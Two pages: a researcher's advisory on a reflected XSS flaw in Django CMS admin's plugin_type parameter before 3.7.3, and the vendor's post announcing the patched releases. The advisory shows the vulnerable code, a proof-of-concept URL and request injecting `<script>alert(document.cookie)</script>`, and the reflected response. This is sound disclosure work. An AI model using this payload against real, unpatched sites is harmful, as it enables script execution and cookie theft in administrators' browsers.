=== Content from sahildhar.github.io_30c56e04_20250114_203221.html ===


[Blog](/)
[Advisories](/advisories)
[Pentest Notes](/notes)
[Frida Snippets](/frida_snippets)
[Contact Me](/contact)

© 2022. All rights reserved.

### [Sahil Dhar](/ "Home") Application Security and Exploitation all day everyday.

# Django CMS - Reflected XSS Vulnerability

22 Jul 2020

Django CMS application does not validate `plugin_type` parameter while generating the error messages for invalid plugin type. The vulnerability allows an attacker to execute arbitrary javascript code in the web browser of affected user.

### **Vendor Advisory**

* https://www.django-cms.org/en/blog/2020/07/22/django-cms-security-updates-1/

### **CVSSv3 score**

7.3 (AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N)

### **Affected versions**

* All django-cms versions prior to 3.7.3

### **Vulnerability summary**

Django CMS application does not validate `plugin_type` parameter while generating the error messages for invalid plugin type. The vulnerability allows an attacker to execute arbitrary javascript code in the web browser of affected user.

### **Technical details**

In the following code snippet, observe that at line:300, the application pass the GET request object `request.GET` as a constructor to `PluginAddValidationForm` class in order to validate the add plugin request parameters.

```
file: /cms/admin/placeholderadmin.py

288     def add_plugin(self, request):
289         """
290         Shows the add plugin form and saves it on POST.
291
292         Requires the following GET parameters:
293             - cms_path
294             - placeholder_id
295             - plugin_type
296             - plugin_language
297             - plugin_parent (optional)
298             - plugin_position (optional)
299         """
300         form = PluginAddValidationForm(request.GET)
301
302         if not form.is_valid():
303             # list() is necessary for python 3 compatibility.
304             # errors is s dict mapping fields to a list of errors
305             # for that field.
306             error = list(form.errors.values())[0][0]
307             return HttpResponseBadRequest(force_text(error))
308
309         plugin_data = form.cleaned_data
310         placeholder = plugin_data['placeholder_id']
311         plugin_type = plugin_data['plugin_type']

```

At line: 1268, observe that the application directly concatenates the user input `plugin_type` to the error message, if the user provides an invalid plugin\_type paramter.

```
file: /cms/admin/forms.py

1250 class PluginAddValidationForm(forms.Form):
1251     placeholder_id = forms.ModelChoiceField(
1252         queryset=Placeholder.objects.all(),
1253         required=True,
1254     )
1255     plugin_language = forms.CharField(required=True)
1256     plugin_parent = forms.ModelChoiceField(
1257         CMSPlugin.objects.all(),
1258         required=False,
1259     )
1260     plugin_type = forms.CharField(required=True)
1261
1262     def clean_plugin_type(self):
1263         plugin_type = self.cleaned_data['plugin_type']
1264
1265         try:
1266             plugin_pool.get_plugin(plugin_type)
1267         except KeyError:
1268             message = ugettext("Invalid plugin type '%s'") % plugin_type

```
### **Proof of concept**

* Login to the application using admin credentials and create a page.
* Add a new plugin to the page.
* In the new browser tab, open the following url:

`http://<example_cms>/en/admin/cms/page/add-plugin/?placeholder_id=2&plugin_type=Bootstrap4CodePlugin"><script>alert(document.cookie)</script>&cms_path=/en/?edit&language=en&plugin_language=en`

```
  GET /en/admin/cms/page/add-plugin/?placeholder_id=2&plugin_type=Bootstrap4CodePlugin"><script>alert(document.cookie)</script>&cms_path=/en/?edit&language=en&plugin_language=en HTTP/1.1
  Host: django-cms.com:8000
  User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate
  Connection: close
  Referer: http://django-cms.com:8000/en/?edit&language=en
  Cookie: django_language=en; csrftoken=liLgHvhAMwI4mGfomHAlfoinhN9Vru7CbzA4FOQ4OP974LFqHZ2e6EsDsKsJpmb4; sessionid=ni8fcfeuk4w6cvjp0cipq19jqjbsuxh5
  Upgrade-Insecure-Requests: 1

```

* Observe that the user input gets reflected in the application’s response.

```
  HTTP/1.1 400 Bad Request
  Date: Fri, 10 Jul 2020 10:15:51 GMT
  Server: WSGIServer/0.2 CPython/3.7.3
  Content-Type: text/html; charset=utf-8
  X-Frame-Options: SAMEORIGIN
  Expires: Fri, 10 Jul 2020 10:15:51 GMT
  Cache-Control: max-age=0, no-cache, no-store, must-revalidate, private
  Content-Length: 83
  Content-Language: en
  Vary: Cookie

  Invalid plugin type 'Bootstrap4CodePlugin"><script>alert(document.cookie)</script>'

```

![poc](/assets/images/django_cms/poc.png)

### **Remediation**

It is recommended to implement **Context Specific** filtering to the user input which needs to be displayed in the application response.

### **Timeline**

| Date | Status |
| --- | --- |
| 10-JUL-2020 | Reported to vendor |
| 10-JUL-2020 | Vendor acknowledgement |
| 21-JUL-2020 | Patch available |
| 22-JUL-2020 | Public disclosure |

Please enable JavaScript to view the [comments powered by Disqus.](https://disqus.com/?ref_noscript)

## Related Posts

* ### [Zoho ManageEngine Log360 - Unauthenticated Remote Code Execution 13 Apr 2022](/blogpost/Zoho-ManageEngine-Log360-Unauthenticated-Remote-Code-Execution/)
* ### [Zoho ManageEngine O365 Manager Plus - Authenticated Command Injection 12 Apr 2022](/blogpost/Zoho-ManageEngine-O365-Manager-Plus-Authenticated-Command-Injection/)
* ### [Zoho ManageEngine O365 Manager Plus - Admin Account Takeover Chain 12 Apr 2022](/blogpost/Zoho-ManageEngine-O365-Manager-Plus-Admin-Account-Takeover-Chain/)



=== Content from www.django-cms.org_f49bf714_20250114_203221.html ===


# [django CMS](/)

* Who we serve
  [for Marketers](/en/solutions-why-django-cms/for-enterprise-marketers/)
  [for Agencies](/en/solutions-why-django-cms/for-agencies-and-service-providers/)
  [for Developers](/en/solutions-why-django-cms/content-management-software-for-developers/)
  [for Universities](/en/solutions-why-django-cms/content-management-universities/)
* About django CMS
  [Features](/en/solutions-why-django-cms/)
  [FAQs](/en/faq/)
  [Case Studies](/en/case-studies/)
  [Ecosystem](/en/repositories-plugins/)
  [Product Vision](/en/product-vision/)
  [Current Projects & Releases](/en/developers/roadmap/)
* Our Community
  [How to contribute](/en/contribute/)
  [The django CMS Association](/en/about-us/)
  [Volunteering](/en/volunteering-opportunities/)
  [Fellowship Program](/en/fellowship-program/)
  [Our Supporters](/en/community/django-cms-supporters/)
  [Events](/en/events/)
  [Experts & Partners](/en/tech-partners/)
* Resources
  [Get our Newsletter](/en/newsletter/)
  [Support](/en/support/)
  [Get started](/en/get-started-django-cms/)
  [News](/en/community/blog/)
  [Developer Docs](/en/developers/documentation/)
  [User Guide](https://user-guide.django-cms.org/en/latest/)
  [Press](/en/press/)
* [Live Demo](/en/django-cms-demo/)
* [Give back ❤️](/en/give-back-to-the-community/)

---

# Content: Blog

[Release](/en/blog/category/release/)

## django CMS security updates

[![Daniele Procida](https://django-cms-2016-69800ad.aldryn-media.io/filer_public_thumbnails/filer_public/4e/3d/4e3da518-ba1b-41e6-94c9-4a04ee54c95e/daniele.png__50x50_q90_crop_subject_location-81%2C66_subsampling-2_upscale.png)](/en/blog/author/daniele-procida/)

[Daniele Procida](/en/blog/author/daniele-procida/)

July 22, 2020

[security](/en/blog/tag/security/)
[3.4](/en/blog/tag/34/)
[3.5](/en/blog/tag/35/)
[3.6](/en/blog/tag/36/)
[3.7](/en/blog/tag/37/)

Security releases for django CMS versions 3.7.x, 3.6.x, 3.5.x and 3.4.x address medium-level vulnerabilities. We recommend updating to version 3.7.4, 3.6.1, 3.5.4 or 3.4.7.

The updated releases are now available from [our GitHub repository](https://github.com/divio/django-cms/) and [PyPI](https://pypi.python.org/pypi/django-cms/). [Divio](https://control.divio.com) users can update their django CMS installations via the Control Panel.

**Details**

django CMS does not validate plugin\_type parameter while generating the error messages for invalid plugin types. The vulnerability allows an attacker to execute arbitrary JavaScript code in the web browser of an affected user.

Please see the relevant commits on GitHub for more information about the vulnerability and mitigation.

Thanks to [**Sahil Dhar**](https://twitter.com/0x401) for the detailed report through our security email.

As ever, we remind our users and contributors that all security reports, patches and concerns be addressed **only** to our security team by email, at [[email protected]](/cdn-cgi/l/email-protection#cab9afa9bfb8a3beb38aaea0aba4ada5e7a9a7b9e4a5b8ad).

**Please do not** use GitHub, our email lists or IRC to report, address or otherwise discuss matters relating to security.

### django CMS SLAs for critical applications

Do you use django CMS in a critically-important application? Please contact Divio for details of SLAs, that will give you access to patches and information about vulnerabilities before disclosures or releases are made public.

[Enterprise Services](https://www.divio.com/en/solutions/enterprise-services/)

Please enable JavaScript to view the [comments powered by Disqus.](http://disqus.com/?ref_noscript)
[blog comments powered by Disqus](http://disqus.com)

* – [Back to Overview](/en/blog/) –

---

## Do you want to test django CMS?

[Try django CMS](//www.django-cms.org/en/test-django-cms/)

django CMS Association

The association behind django CMS

Email [[email protected]](/cdn-cgi/l/email-protection#4821262e27082c2229262f27652b253b66273a2f)

[Subscribe to Newsletter](//www.django-cms.org/en/newsletter/)

###### Community

[Blog](/en/community/blog/)

[Events](/en/community/events/)

[Security](/en/community/security/)

[Our Supporters](/en/community/django-cms-supporters/)

###### Developers

[Documentation](/en/developers/documentation/)

[Roadmap](/en/developers/roadmap/)

[Repository](/en/developers/repository/)

[Issue tracker](/en/developers/issue-tracker/)

###### Follow us

[![icon-github.png](https://django-cms-2016-69800ad.aldryn-media.io/filer_public/3b/4b/3b4b7b5c-34ee-405f-aef1-167821359c6d/icon-github.png)](https://github.com/divio/django-cms)
  [![icon-linkedin-32.png](https://django-cms-2016-69800ad.aldryn-media.io/filer_public/b1/8d/b18d2af6-dad7-456c-b6c5-350ae0dfbde9/icon-linkedin-32.png)](https://www.linkedin.com/company/56462850)
[Mastodon](https://fosstodon.org/%40djangocms)
[Youtube](https://www.youtube.com/c/djangocms)

Join our [Discord Community](http://discord-main-channel.django-cms.org)

* [Support](/en/support/)
* [Security](/en/support/)
* [Site Notice](/en/site-notice/)
* [Press](/en/press/)
* Privacy Settings

Copyright © 2001 - 2025 Divio AG. BSD Open-Source License.

Django CMS is based on [Python](https://www.python.org/) and [Django](https://www.djangoproject.com/)

A project backed by the django CMS Association

Accept
This website uses cookies to help ensure that you enjoy the best experience.

×
#### Privacy Settings

Websites do not have full control over cookies that may set by various third-party scripts.
To see detailed information about and to manage cookies in your browser, please check its privacy
settings.

##### Essentials

These cookies and scripts cannot be deactivated as they are needed to correctly render this website.

* Segment
* Intercom

---

Accept

### Please enable JavaScript

### Your browser is out-of-date!

Update your browser to view this website correctly.

[Update my browser now](http://outdatedbrowser.com/)

×


